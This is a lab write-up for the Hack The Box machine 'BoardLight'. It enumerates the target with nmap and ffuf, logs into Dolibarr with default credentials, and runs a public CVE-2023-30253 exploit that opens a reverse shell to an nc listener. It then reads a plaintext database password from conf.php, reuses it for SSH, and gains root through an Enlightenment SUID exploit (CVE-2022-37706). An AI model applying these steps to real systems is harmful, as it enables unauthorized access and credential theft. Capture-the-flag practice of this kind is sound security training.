## BoardLight

### Lab Details 

- Difficulty: East
- Type: Web App, Priv Esc, Linux

#### Initial Foothold 
- nmap on target
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

- enumerate web app on http
	- Subdomain scan
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://board.htb -H "HOST: FUZZ.board.htb" -fs 15949,0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949,0
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 2531ms]
```
 - directory scan
```
$ ffuf -u http://board.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 809ms]
contact.php             [Status: 200, Size: 9426, Words: 3295, Lines: 295, Duration: 613ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 236ms]
.                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 233ms]
about.php               [Status: 200, Size: 9100, Words: 3084, Lines: 281, Duration: 896ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 814ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 458ms]
do.php                  [Status: 200, Size: 9209, Words: 3173, Lines: 295, Duration: 211ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 231ms]
.htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 461ms]
.htpasswds              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 668ms]
.htgroup                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 237ms]
wp-forum.phps           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 367ms]
.htaccess.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 466ms]
.htuser                 [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 534ms]
.ht                     [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 813ms]
.htc                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 813ms]
dispatch.fcgi           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 464ms]
mytias.fcgi             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 736ms]
test.fcgi               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 344ms]
```
- from the subdomain scan it revealed the subdomain `crm`, add the subdomain to `/etc/hosts`
- we can attempt to access the found subdomain, presents us with a login screen and the name of the CRM app
- upon searching the application we find the default credentials for the application to be `admin:admin`
- search for vulnerability of `Dolibarr version 17.0.0`, POC: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/tree/main
- we can attempt running the exploit 
```
$ python3 exploit.py http://crm.board.htb admin admin 10.10.16.20 9001

## nc listener
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.11] 53902
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
```
#### Lateral Movement (If any)
- after running `linpeas.sh` nothing useful was found in regard to locating credentials of other users
- searched for connection details for Dolibarr 
- able to locate the database connection details for Dolibarr
```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
<snip>
```
- we can then login as larissa via ssh

#### Privilege Escalation
- tried `sudo -l`, user larissa isnt able to run `sudo` on the server
- run `linpeas.sh` again and found some unusual `SUID binaries`
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                         
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                
-rwsr-sr-x 1 root root 15K Apr  8  2024 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!) 
```
- searched online and it appears to be a desktop environment 
- from the output of `linpeas.sh`, we can tell that the version is `0.23.1`
- POC for `Enlightenment 0.23.1`: https://github.com/d3ndr1t30x/CVE-2022-37706
- load the POC to target and run, we get root
```
larissa@boardlight:~$ chmod +x exploit.sh 
larissa@boardlight:~$ ./exploit.sh                                                                    
CVE-2022-37706 Exploit Initiated
[*] Using known path to vulnerable binary...
[+] Vulnerable SUID binary found at: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
[*] Preparing exploit directories and files...
[+] Exploit script created. Attempting to escalate privileges...
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

#### Resources

#### Lesson Learned
- Look up anything thats strange or unusual after a scan 
